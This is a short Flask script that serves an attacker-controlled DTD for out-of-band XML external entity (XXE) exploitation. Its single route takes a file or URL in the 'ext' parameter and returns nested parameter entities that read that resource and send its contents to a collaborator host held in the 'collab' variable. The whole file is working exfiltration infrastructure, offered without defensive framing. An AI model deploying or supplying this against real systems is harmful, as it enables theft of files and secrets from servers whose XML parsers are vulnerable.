from flask import Flask, abort, request, Response

app = Flask(__name__)

collab = ""

@app.route("/malicious.dtd", methods=["GET"])
def malicious():
    if request.args.get('ext'):
        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('ext') + '"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'' + collab + '/?x=%ext;\'>">%eval;%exfiltrate;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="Missing external entity parameter 'ext'.")
